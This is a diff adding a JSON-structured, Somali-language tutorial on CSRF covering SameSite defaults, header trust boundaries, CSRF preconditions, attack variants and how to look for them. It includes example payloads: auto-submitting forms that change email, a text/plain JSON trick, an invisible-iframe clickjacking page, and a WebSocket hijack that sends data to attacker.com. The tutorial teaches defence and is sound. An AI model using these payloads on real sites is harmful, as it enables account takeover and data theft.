+     "id": "part-2-b49"
+    },
+    {
+     "type": "para",
+     "html": "Subresource waa marka browser-ku uu soo raro resource:",
+     "text": "Subresource waa marka browser-ku uu soo raro resource:",
+     "id": "part-2-b50"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "<img src=\"https://...\">",
+      "<script src=\"https://...\">",
+      "fetch(\"https://...\")"
+     ],
+     "id": "part-2-b51"
+    },
+    {
+     "type": "para",
+     "html": ": SameSite=Lax wuxuu dirayaa cookie-ga top-level navigation kaliya. SameSite=Strict ma diro waxba.",
+     "text": ": SameSite=Lax wuxuu dirayaa cookie-ga top-level navigation kaliya. SameSite=Strict ma diro waxba.",
+     "id": "part-2-b52"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "2.4.4 Default SameSite",
+     "text": "2.4.4 Default SameSite",
+     "id": "part-2-b53",
+     "slug": "2-4-4-default-samesite"
+    },
+    {
+     "type": "para",
+     "html": "Haddii server-ku aanu dhigin SameSite, browser-ku wuxuu isticmaalaa default:",
+     "text": "Haddii server-ku aanu dhigin SameSite, browser-ku wuxuu isticmaalaa default:",
+     "id": "part-2-b54"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Chrome: <code>Lax</code>",
+       "text": "Chrome: Lax",
+       "level": 0
+      },
+      {
+       "html": "Firefox: <code>Lax</code> (recent versions)",
+       "text": "Firefox: Lax (recent versions)",
+       "level": 0
+      },
+      {
+       "html": "Safari: <code>Lax</code> (recent versions)",
+       "text": "Safari: Lax (recent versions)",
+       "level": 0
+      }
+     ],
+     "id": "part-2-b55"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Headers: Trust Boundaries",
+     "text": "Headers: Trust Boundaries",
+     "id": "part-2-b56",
+     "slug": "headers-trust-boundaries"
+    },
+    {
+     "type": "para",
+     "html": "Headers waa trust boundaries. Waxaa jira headers oo browser-ku maamulo (ma beddeli karo attacker) iyo headers oo attacker-ku maamulo.",
+     "text": "Headers waa trust boundaries. Waxaa jira headers oo browser-ku maamulo (ma beddeli karo attacker) iyo headers oo attacker-ku maamulo.",
+     "id": "part-2-b57"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "2.5.1 Browser-Controlled Headers",
+     "text": "2.5.1 Browser-Controlled Headers",
+     "id": "part-2-b58",
+     "slug": "2-5-1-browser-controlled-headers"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>Host</code>  , <code>Origin</code><code> iyo </code><code>Referer</code> attacker-ku ma beddeli karo (laakiin wuu tirtiri karaa).",
+       "text": "Host  , Origin iyo Referer attacker-ku ma beddeli karo (laakiin wuu tirtiri karaa).",
+       "level": 0
+      }
+     ],
+     "id": "part-2-b59"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Attacker-Controlled Headers",
+     "text": "Attacker-Controlled Headers",
+     "id": "part-2-b60",
+     "slug": "attacker-controlled-headers"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>User-Agent</code> — attacker-ku wuu beddeli karaa.",
+       "text": "User-Agent — attacker-ku wuu beddeli karaa.",
+       "level": 0
+      },
+      {
+       "html": "<code>Content-Type</code> — attacker-ku wuu beddeli karaa (laakiin browser-ku wuu xaddidaa).",
+       "text": "Content-Type — attacker-ku wuu beddeli karaa (laakiin browser-ku wuu xaddidaa).",
+       "level": 0
+      },
+      {
+       "html": "<code>X-*</code> — attacker-ku wuu beddeli karaa.",
+       "text": "X-* — attacker-ku wuu beddeli karaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-2-b61"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "HTTP/2 iyo HTTP/3: Mustaqbalka",
+     "text": "HTTP/2 iyo HTTP/3: Mustaqbalka",
+     "id": "part-2-b62",
+     "slug": "http-2-iyo-http-3-mustaqbalka"
+    },
+    {
+     "type": "para",
+     "html": "HTTP/2 iyo HTTP/3 waxay la yimaadeen isbeddello. Laakiin aasaaska CSRF wuu sii jiraa. Cookies wali waa la diraa. SameSite wali waa defense. Origin wali waa browser-controlled.",
+     "text": "HTTP/2 iyo HTTP/3 waxay la yimaadeen isbeddello. Laakiin aasaaska CSRF wuu sii jiraa. Cookies wali waa la diraa. SameSite wali waa defense. Origin wali waa browser-controlled.",
+     "id": "part-2-b63"
+    },
+    {
+     "type": "para",
+     "html": "Protocol-ku wuu isbeddelaa. Laakiin falsafadda waa isla midii. Waa confused deputy. Waa statelessness. Waa trust boundary.",
+     "text": "Protocol-ku wuu isbeddelaa. Laakiin falsafadda waa isla midii. Waa confused deputy. Waa statelessness. Waa trust boundary.",
+     "id": "part-2-b64"
+    },
+    {
+     "type": "para",
+     "html": "mental model:",
+     "text": "mental model:",
+     "id": "part-2-b65"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "REQUEST",
+      "├── Method (Attacker-controlled) ← state-changing?",
+      "├── Path (Attacker-controlled) ← protection?",
+      "├── Headers",
+      "│   ├── Host (Browser-controlled) ← Same-site determinant",
+      "│   ├── Origin (Browser-controlled) ← Trust boundary",
+      "│   ├── Referer (Browser-controlled, attacker can suppress) ← Weak defense",
+      "│   ├── Cookie (Browser-controlled) ← Badge",
+      "│   └── Custom (Attacker-controlled) ← Weak defense",
+      "├── Body (Attacker-controlled) ← Payload",
+      "│   └── csrf (Attacker can remove/modify) ← Defense?",
+      "└── Response",
+      "    ├── Status (Server-controlled) ← Success/failure",
+      "    ├── Set-Cookie (Server-controlled) ← SameSite",
+      "    └── Body (Server-controlled) ← Side effects"
+     ],
+     "id": "part-2-b66"
+    }
+   ],
+   "id": "part-2",
+   "index": 2
+  },
+  {
+   "title": "QAYBTA III  ANATOMY OF CSRF",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "CSRF waa nooc gaar ah oo attack ah. Wuxuu leeyahay shuruudo gaar ah. Wuxuu leeyahay dabeecad gaar ah. Wuxuu leeyahay falsafad gaar ah.",
+     "text": "CSRF waa nooc gaar ah oo attack ah. Wuxuu leeyahay shuruudo gaar ah. Wuxuu leeyahay dabeecad gaar ah. Wuxuu leeyahay falsafad gaar ah.",
+     "id": "part-3-b0"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Shuruudaha CSRF: Afarta Tiir",
+     "text": "Shuruudaha CSRF: Afarta Tiir",
+     "id": "part-3-b1",
+     "slug": "shuruudaha-csrf-afarta-tiir"
+    },
+    {
+     "type": "para",
+     "html": "CSRF wuxuu dhacaa kaliya haddii afartan shuruudood ay buuxaan. Haddii mid ka mid ah aanu buuxin, CSRF ma dhaco. Waa afarta tiir ee CSRF.",
+     "text": "CSRF wuxuu dhacaa kaliya haddii afartan shuruudood ay buuxaan. Haddii mid ka mid ah aanu buuxin, CSRF ma dhaco. Waa afarta tiir ee CSRF.",
+     "id": "part-3-b2"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tiirka 1: Action-ka Waa In Uu Beddelaa State",
+     "text": "Tiirka 1: Action-ka Waa In Uu Beddelaa State",
+     "id": "part-3-b3",
+     "slug": "tiirka-1-action-ka-waa-in-uu-beddelaa-state"
+    },
+    {
+     "type": "para",
+     "html": "Waa in uu jiro action oo wax beddela. Action-ka waa in aanu ahaan read-only. Waa in uu ahaadaa state-changing.",
+     "text": "Waa in uu jiro action oo wax beddela. Action-ka waa in aanu ahaan read-only. Waa in uu ahaadaa state-changing.",
+     "id": "part-3-b4"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b5"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>POST /change-email</code> — Haa, wuxuu beddelaa state.",
+       "text": "POST /change-email — Haa, wuxuu beddelaa state.",
+       "level": 0
+      },
+      {
+       "html": "<code>POST /change-password</code> — Haa, wuxuu beddelaa state.",
+       "text": "POST /change-password — Haa, wuxuu beddelaa state.",
+       "level": 0
+      },
+      {
+       "html": "<code>POST /transfer</code> — Haa, wuxuu beddelaa state.",
+       "text": "POST /transfer — Haa, wuxuu beddelaa state.",
+       "level": 0
+      },
+      {
+       "html": "<code>GET /profile</code> — Maya, waa read-only.",
+       "text": "GET /profile — Maya, waa read-only.",
+       "level": 0
+      },
+      {
+       "html": "<code>GET /search</code> — Maya, waa read-only.",
+       "text": "GET /search — Maya, waa read-only.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b6"
+    },
+    {
+     "type": "para",
+     "html": "Action-ka waa ujeedda. Waa waxa attacker-ku rabo. Haddii action-ku aanu beddelin state, attacker-ku kama faa'iidaysto. Wuxuu rabaa impact. Wuxuu rabaa side effect. Wuxuu rabaa wax beddela.",
+     "text": "Action-ka waa ujeedda. Waa waxa attacker-ku rabo. Haddii action-ku aanu beddelin state, attacker-ku kama faa'iidaysto. Wuxuu rabaa impact. Wuxuu rabaa side effect. Wuxuu rabaa wax beddela.",
+     "id": "part-3-b7"
+    },
+    {
+     "type": "para",
+     "html": "Haddii action-ku beddelo state aan muhiim ahayn (tusaale \"change theme\"), CSRF wuu jiraa laakiin impact wuu yar yahay.",
+     "text": "Haddii action-ku beddelo state aan muhiim ahayn (tusaale \"change theme\"), CSRF wuu jiraa laakiin impact wuu yar yahay.",
+     "id": "part-3-b8"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tiirka 2: Authentication Waa Cookie-Based",
+     "text": "Tiirka 2: Authentication Waa Cookie-Based",
+     "id": "part-3-b9",
+     "slug": "tiirka-2-authentication-waa-cookie-based"
+    },
+    {
+     "type": "para",
+     "html": "Authentication-ka waa in uu cookie-based yahay. Waa in uu browser-ku si toos ah u diraa cookie-ga.",
+     "text": "Authentication-ka waa in uu cookie-based yahay. Waa in uu browser-ku si toos ah u diraa cookie-ga.",
+     "id": "part-3-b10"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b11"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Session cookie — Haa, waa cookie-based.",
+       "text": "Session cookie — Haa, waa cookie-based.",
+       "level": 0
+      },
+      {
+       "html": "JWT cookie — Haa, waa cookie-based.",
+       "text": "JWT cookie — Haa, waa cookie-based.",
+       "level": 0
+      },
+      {
+       "html": "JWT header (<code>Authorization: Bearer ...</code>) — Maya, attacker-ku ma maamulo.",
+       "text": "JWT header (Authorization: Bearer ...) — Maya, attacker-ku ma maamulo.",
+       "level": 0
+      },
+      {
+       "html": "API key header — Maya, attacker-ku ma maamulo.",
+       "text": "API key header — Maya, attacker-ku ma maamulo.",
+       "level": 0
+      },
+      {
+       "html": "Basic auth — Haa, browser-ku wuu diraa.",
+       "text": "Basic auth — Haa, browser-ku wuu diraa.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b12"
+    },
+    {
+     "type": "para",
+     "html": "Authentication-ka waa badge. Waa possession. Waa wax browser-ku hayo. Haddii authentication-ku aanu cookie-based ahayn (tusaale header-based), attacker-ku ma maamulo. CSRF ma dhaco.",
+     "text": "Authentication-ka waa badge. Waa possession. Waa wax browser-ku hayo. Haddii authentication-ku aanu cookie-based ahayn (tusaale header-based), attacker-ku ma maamulo. CSRF ma dhaco.",
+     "id": "part-3-b13"
+    },
+    {
+     "type": "para",
+     "html": "CSRF wuxuu ku xiran yahay browser-ku si toos ah u diraa cookie-ga. Haddii authentication-ku uu ku jiro header oo attacker-ku maamulo, waa XSS ama token theft, ma aha CSRF.",
+     "text": "CSRF wuxuu ku xiran yahay browser-ku si toos ah u diraa cookie-ga. Haddii authentication-ku uu ku jiro header oo attacker-ku maamulo, waa XSS ama token theft, ma aha CSRF.",
+     "id": "part-3-b14"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tiirka 3: Ma Jiro Token Sir Ah (Ama Waa La Jabin Karaa)",
+     "text": "Tiirka 3: Ma Jiro Token Sir Ah (Ama Waa La Jabin Karaa)",
+     "id": "part-3-b15",
+     "slug": "tiirka-3-ma-jiro-token-sir-ah-ama-waa-la-jabin-karaa"
+    },
+    {
+     "type": "para",
+     "html": "Macnaha Waa in aanu jirin token sir ah oo attacker-ku aanu garanayn. Ama haddii uu jiro, waa in la jabin karo.",
+     "text": "Macnaha Waa in aanu jirin token sir ah oo attacker-ku aanu garanayn. Ama haddii uu jiro, waa in la jabin karo.",
+     "id": "part-3-b16"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b17"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Ma jiro token — Haa, CSRF wuu dhacaa.",
+       "text": "Ma jiro token — Haa, CSRF wuu dhacaa.",
+       "level": 0
+      },
+      {
+       "html": "Token wuu jiraa laakiin lama xaqiijin — Haa, CSRF wuu dhacaa.",
+       "text": "Token wuu jiraa laakiin lama xaqiijin — Haa, CSRF wuu dhacaa.",
+       "level": 0
+      },
+      {
+       "html": "Token wuu jiraa laakiin lagu xaqiijiyay method gaar ah — Haa, CSRF wuu dhacaa (method override).",
+       "text": "Token wuu jiraa laakiin lagu xaqiijiyay method gaar ah — Haa, CSRF wuu dhacaa (method override).",
+       "level": 0
+      },
+      {
+       "html": "Token wuu jiraa laakiin lagu xaqiijiyay presence — Haa, CSRF wuu dhacaa (tirtir token).",
+       "text": "Token wuu jiraa laakiin lagu xaqiijiyay presence — Haa, CSRF wuu dhacaa (tirtir token).",
+       "level": 0
+      },
+      {
+       "html": "Token wuu jiraa laakiin lagu xaqiijiyay cookie — Haa, CSRF wuu dhacaa (CRLF injection).",
+       "text": "Token wuu jiraa laakiin lagu xaqiijiyay cookie — Haa, CSRF wuu dhacaa (CRLF injection).",
+       "level": 0
+      },
+      {
+       "html": "Token wuu  jiraa oo si sax ah loo xaqiijiyay — Maya, CSRF ma dhaco.",
+       "text": "Token wuu  jiraa oo si sax ah loo xaqiijiyay — Maya, CSRF ma dhaco.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b18"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku waa caqabad. Waa obstacle. Waa defense. Haddii token-ku maqan yahay ama la jabsan karo, attacker-ku wuu ka gudbaa. Haddii token-ku adag yahay, attacker-ku ma gudbi karo.",
+     "text": "Token-ku waa caqabad. Waa obstacle. Waa defense. Haddii token-ku maqan yahay ama la jabsan karo, attacker-ku wuu ka gudbaa. Haddii token-ku adag yahay, attacker-ku ma gudbi karo.",
+     "id": "part-3-b19"
+    },
+    {
+     "type": "para",
+     "html": "Token-ku waa in uu sir yahay. Waa in uu random yahay. Waa in uu session-ka ku xiran yahay. Waa in uu single-use yahay. Haddii mid ka mid ah aanu buuxin, waa la jabsan karaa.",
+     "text": "Token-ku waa in uu sir yahay. Waa in uu random yahay. Waa in uu session-ka ku xiran yahay. Waa in uu single-use yahay. Haddii mid ka mid ah aanu buuxin, waa la jabsan karaa.",
+     "id": "part-3-b20"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tiirka 4: Browser-ku Wuxuu Diri Karaa Request-ka",
+     "text": "Tiirka 4: Browser-ku Wuxuu Diri Karaa Request-ka",
+     "id": "part-3-b21",
+     "slug": "tiirka-4-browser-ku-wuxuu-diri-karaa-request-ka"
+    },
+    {
+     "type": "para",
+     "html": "Waa in browser-ku uu diri karo request-ka cross-site. Waa in aanu jirin caqabad oo browser-ku joojinayo.",
+     "text": "Waa in browser-ku uu diri karo request-ka cross-site. Waa in aanu jirin caqabad oo browser-ku joojinayo.",
+     "id": "part-3-b22"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b23"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "SameSite=None — Haa, browser-ku wuu diraa.",
+       "text": "SameSite=None — Haa, browser-ku wuu diraa.",
+       "level": 0
+      },
+      {
+       "html": "SameSite=Lax + POST — Maya, browser-ku ma diro.",
+       "text": "SameSite=Lax + POST — Maya, browser-ku ma diro.",
+       "level": 0
+      },
+      {
+       "html": "SameSite=Lax + GET + top-level — Haa, browser-ku wuu diraa.",
+       "text": "SameSite=Lax + GET + top-level — Haa, browser-ku wuu diraa.",
+       "level": 0
+      },
+      {
+       "html": "SameSite=Strict — Maya, browser-ku ma diro.",
+       "text": "SameSite=Strict — Maya, browser-ku ma diro.",
+       "level": 0
+      },
+      {
+       "html": "CORS preflight — Maya, browser-ku ma diro (haddii aan la ogolaan).",
+       "text": "CORS preflight — Maya, browser-ku ma diro (haddii aan la ogolaan).",
+       "level": 0
+      },
+      {
+       "html": "CORS misconfiguration — Haa, browser-ku wuu diraa.",
+       "text": "CORS misconfiguration — Haa, browser-ku wuu diraa.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b24"
+    },
+    {
+     "type": "para",
+     "html": "Browser-ku waa gatekeeper. Waa guard. Haddii browser-ku uu diido, attacker-ku ma gudbi karo. Haddii browser-ku uu ogolaado, attacker-ku wuu gudbaa.",
+     "text": "Browser-ku waa gatekeeper. Waa guard. Haddii browser-ku uu diido, attacker-ku ma gudbi karo. Haddii browser-ku uu ogolaado, attacker-ku wuu gudbaa.",
+     "id": "part-3-b25"
+    },
+    {
+     "type": "para",
+     "html": "Browser-ku wuxuu leeyahay rules oo ku saabsan cross-site requests. SameSite waa rule. CORS waa rule. SOP waa rule. ",
+     "text": "Browser-ku wuxuu leeyahay rules oo ku saabsan cross-site requests. SameSite waa rule. CORS waa rule. SOP waa rule.",
+     "id": "part-3-b26"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Noocyada CSRF",
+     "text": "Noocyada CSRF",
+     "id": "part-3-b27",
+     "slug": "noocyada-csrf"
+    },
+    {
+     "type": "para",
+     "html": "CSRF wuxuu leeyahay noocyo badan. Nooc kastaa wuxuu leeyahay dabeecad iyo farsamo gaar ah.",
+     "text": "CSRF wuxuu leeyahay noocyo badan. Nooc kastaa wuxuu leeyahay dabeecad iyo farsamo gaar ah.",
+     "id": "part-3-b28"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "GET-Based CSRF",
+     "text": "GET-Based CSRF",
+     "id": "part-3-b29",
+     "slug": "get-based-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Request-ku waa GET. Action-ka wuxuu ku jiraa query string.",
+     "text": "Request-ku waa GET. Action-ka wuxuu ku jiraa query string.",
+     "id": "part-3-b30"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b31"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "<img src=\"https://target.com/change-email?email=attacker@evil.com\">"
+     ],
+     "id": "part-3-b32"
+    },
+    {
+     "type": "para",
+     "html": "GET-based CSRF waa nooca ugu fudud. Waa nooca ugu horeeya. Wuu shaqeeyaa sababtoo ah browser-ku wuxuu si toos ah u soo raraa images. Attacker-ku ma u baahna form.",
+     "text": "GET-based CSRF waa nooca ugu fudud. Waa nooca ugu horeeya. Wuu shaqeeyaa sababtoo ah browser-ku wuxuu si toos ah u soo raraa images. Attacker-ku ma u baahna form.",
+     "id": "part-3-b33"
+    },
+    {
+     "type": "para",
+     "html": "GET-based CSRF waa mid naadir ah maalmahan. Developers-ku waxay barteen in aanay isticmaalin GET for state-changing actions. Laakiin wali wuu jiraa — haddii developer-ku uu isticmaalo <code>$_</code><code>GET[</code><code>'email']</code> si uu u beddelo email, GET-based CSRF wuu shaqeynaa.",
+     "text": "GET-based CSRF waa mid naadir ah maalmahan. Developers-ku waxay barteen in aanay isticmaalin GET for state-changing actions. Laakiin wali wuu jiraa — haddii developer-ku uu isticmaalo $_GET['email'] si uu u beddelo email, GET-based CSRF wuu shaqeynaa.",
+     "id": "part-3-b34"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto <code>GET /change-email</code><code>?email</code><code>=...</code>, is weydii: \"muxuu server-ku u ogolaaday GET inuu beddelo state?\" Tani waa red flag.",
+     "text": "Marka aad aragto GET /change-email?email=..., is weydii: \"muxuu server-ku u ogolaaday GET inuu beddelo state?\" Tani waa red flag.",
+     "id": "part-3-b35"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " POST-Based CSRF",
+     "text": "POST-Based CSRF",
+     "id": "part-3-b36",
+     "slug": "post-based-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Request-ku waa POST. Action-ka wuxuu ku jiraa body.",
+     "text": "Request-ku waa POST. Action-ka wuxuu ku jiraa body.",
+     "id": "part-3-b37"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b38"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<form method=\"POST\" action=\"https://target.com/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-3-b39"
+    },
+    {
+     "type": "para",
+     "html": "POST-based CSRF waa nooca ugu badan.  sababtoo ah browser-ku wuxuu si toos ah u submit-gareeyaa forms. Attacker-ku wuxuu isticmaalaa <code>document.forms[</code><code>0].submit()</code>.",
+     "text": "POST-based CSRF waa nooca ugu badan.  sababtoo ah browser-ku wuxuu si toos ah u submit-gareeyaa forms. Attacker-ku wuxuu isticmaalaa document.forms[0].submit().",
+     "id": "part-3-b40"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto <code>POST /change-email</code>, is weydii: \"Ma jiraa CSRF token?\" Haddii uumaqan, waa red flag.",
+     "text": "Marka aad aragto POST /change-email, is weydii: \"Ma jiraa CSRF token?\" Haddii uumaqan, waa red flag.",
+     "id": "part-3-b41"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "WebSocket CSRF (CSWSH)",
+     "text": "WebSocket CSRF (CSWSH)",
+     "id": "part-3-b42",
+     "slug": "websocket-csrf-cswsh"
+    },
+    {
+     "type": "para",
+     "html": "Request-ku waa WebSocket handshake. Waa GET laakiin wuxuu leeyahay <code>Upgrade: websocket</code>.",
+     "text": "Request-ku waa WebSocket handshake. Waa GET laakiin wuxuu leeyahay Upgrade: websocket.",
+     "id": "part-3-b43"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b44"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "var ws = new WebSocket('wss://target.com/chat');",
+      "ws.onopen = function() { ws.send(\"READY\"); };",
+      "ws.onmessage = function(event) {",
+      "    fetch('https://attacker.com', {method: 'POST', body: event.data});",
+      "};"
+     ],
+     "id": "part-3-b45"
+    },
+    {
+     "type": "para",
+     "html": "CSWSH waa nooc gaar ah. Waa CSRF nooca WebSocket. ",
+     "text": "CSWSH waa nooc gaar ah. Waa CSRF nooca WebSocket.",
+     "id": "part-3-b46"
+    },
+    {
+     "type": "para",
+     "html": "CSWSH wuxuu u baahan yahay WebSocket connection. Waa in la furo connection. Waa in la diraa messages. Waa in la exfiltrate-gareeyaa xogta.",
+     "text": "CSWSH wuxuu u baahan yahay WebSocket connection. Waa in la furo connection. Waa in la diraa messages. Waa in la exfiltrate-gareeyaa xogta.",
+     "id": "part-3-b47"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto WebSocket handshake, hadii uu maqan yahaya CSRF token?\" waa red flag.",
+     "text": "Marka aad aragto WebSocket handshake, hadii uu maqan yahaya CSRF token?\" waa red flag.",
+     "id": "part-3-b48"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "JSON-Based CSRF",
+     "text": "JSON-Based CSRF",
+     "id": "part-3-b49",
+     "slug": "json-based-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Request-ku wuxuu dirayaa JSON. Wuu adag yahay sababtoo ah <code>Content-Type: application/json</code> wuxuu kiciyaa preflight request.",
+     "text": "Request-ku wuxuu dirayaa JSON. Wuu adag yahay sababtoo ah Content-Type: application/json wuxuu kiciyaa preflight request.",
+     "id": "part-3-b50"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b51"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "<form method=\"POST\" action=\"https://target.com/api/change-email\" enctype=\"text/plain\">",
+      "    <input type=\"hidden\" name='{\"email\":\"attacker@evil.com\",\"x\":\"' value='\"}'>",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-3-b52"
+    },
+    {
+     "type": "para",
+     "html": "JSON-based CSRF waa nooc adag. Oo cusub. haddii server-ku uu aqbalo <code>text/plain</code> ama <code>application/x-www-form-urlencoded</code>. Wuxuu isticmaalaa <code>enctype=\"text/plain\"</code> si uu u sameeyo JSON-like body.",
+     "text": "JSON-based CSRF waa nooc adag. Oo cusub. haddii server-ku uu aqbalo text/plain ama application/x-www-form-urlencoded. Wuxuu isticmaalaa enctype=\"text/plain\" si uu u sameeyo JSON-like body.",
+     "id": "part-3-b53"
+    },
+    {
+     "type": "para",
+     "html": "JSON-based CSRF wuxuu u baahan yahay server-ku inuu aqbalo content-type kale. Haddii server-ku uu diido <code>text/plain</code>, JSON-based CSRF ma shaqeeyo.",
+     "text": "JSON-based CSRF wuxuu u baahan yahay server-ku inuu aqbalo content-type kale. Haddii server-ku uu diido text/plain, JSON-based CSRF ma shaqeeyo.",
+     "id": "part-3-b54"
+    },
+    {
+     "type": "para",
+     "html": "Marka aad aragto API endpoint oo JSON ah, is weydii: \"Ma aqbalaa <code>text/plain</code>?\" Haddii  ay haa tahay, waa red flag.",
+     "text": "Marka aad aragto API endpoint oo JSON ah, is weydii: \"Ma aqbalaa text/plain?\" Haddii  ay haa tahay, waa red flag.",
+     "id": "part-3-b55"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Clickjacking + CSRF",
+     "text": "Clickjacking + CSRF",
+     "id": "part-3-b56",
+     "slug": "clickjacking-csrf"
+    },
+    {
+     "type": "para",
+     "html": "Dabeecadda: Attacker-ku wuxuu isticmaalaa iframe si uu victim ugu qasbo inuu riixo button. Waa CSRF  oo nooc kale.",
+     "text": "Dabeecadda: Attacker-ku wuxuu isticmaalaa iframe si uu victim ugu qasbo inuu riixo button. Waa CSRF  oo nooc kale.",
+     "id": "part-3-b57"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-3-b58"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<style>",
+      "    iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }",
+      "    button { position: absolute; top: 300px; left: 200px; z-index: 1; }",
+      "</style>",
+      "<iframe src=\"https://target.com/change-email\"></iframe>",
+      "<button>Click me!</button>"
+     ],
+     "id": "part-3-b59"
+    },
+    {
+     "type": "para",
+     "html": "Clickjacking Waa visual CSRF. browser-ku wuxuu u ogolaadaa iframe. Wuxuu isticmaalaa transparency iyo positioning.",
+     "text": "Clickjacking Waa visual CSRF. browser-ku wuxuu u ogolaadaa iframe. Wuxuu isticmaalaa transparency iyo positioning.",
+     "id": "part-3-b60"
+    },
+    {
+     "type": "para",
+     "html": "Clickjacking wuxuu u baahan yahay X-Frame-Options maqan. Haddii X-Frame-Options jiro, clickjacking ma shaqeeyo.",
+     "text": "Clickjacking wuxuu u baahan yahay X-Frame-Options maqan. Haddii X-Frame-Options jiro, clickjacking ma shaqeeyo.",
+     "id": "part-3-b61"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Sida Loo Helo CSRF",
+     "text": "Sida Loo Helo CSRF",
+     "id": "part-3-b62",
+     "slug": "sida-loo-helo-csrf"
+    },
+    {
+     "type": "para",
+     "html": "CSRF ma aha wax lagu helo shil. Waa wax lagu helo hab. Waa wax lagu helo fikir. Waa wax lagu helo systematic approach.",
+     "text": "CSRF ma aha wax lagu helo shil. Waa wax lagu helo hab. Waa wax lagu helo fikir. Waa wax lagu helo systematic approach.",
+     "id": "part-3-b63"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Tallaabo 1: Hel Dhammaan Actions-ka State-Changing",
+     "text": "Tallaabo 1: Hel Dhammaan Actions-ka State-Changing",
+     "id": "part-3-b64",
+     "slug": "tallaabo-1-hel-dhammaan-actions-ka-state-changing"
+    },
+    {
+     "type": "para",
+     "html": "Waa in la helo dhammaan actions-ka beddela state. Ma aha mid. Ma aha laba. Waa dhammaan.",
+     "text": "Waa in la helo dhammaan actions-ka beddela state. Ma aha mid. Ma aha laba. Waa dhammaan.",
+     "id": "part-3-b65"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Burp Spider — wuxuu helaa links.",
+       "text": "Burp Spider — wuxuu helaa links.",
+       "level": 0
+      },
+      {
+       "html": "ffuf/gobuster — wuxuu helaa endpoints.",
+       "text": "ffuf/gobuster — wuxuu helaa endpoints.",
+       "level": 0
+      },
+      {
+       "html": "JavaScript analysis — wuxuu helaa endpoints qarsoon.",
+       "text": "JavaScript analysis — wuxuu helaa endpoints qarsoon.",
+       "level": 0
+      },
+      {
+       "html": "API documentation — wuxuu helaa endpoints.",
+       "text": "API documentation — wuxuu helaa endpoints.",
+       "level": 0
+      },
+      {
+       "html": "Sitemap.xml, robots.txt — wuxuu helaa paths.",
+       "text": "Sitemap.xml, robots.txt — wuxuu helaa paths.",
+       "level": 0
+      }
+     ],
+     "id": "part-3-b66"
+    },
+    {
+     "type": "para",
+     "html": " Waa in la helo dhammaan actions-ka. Waa in la sameeyaa inventory.",
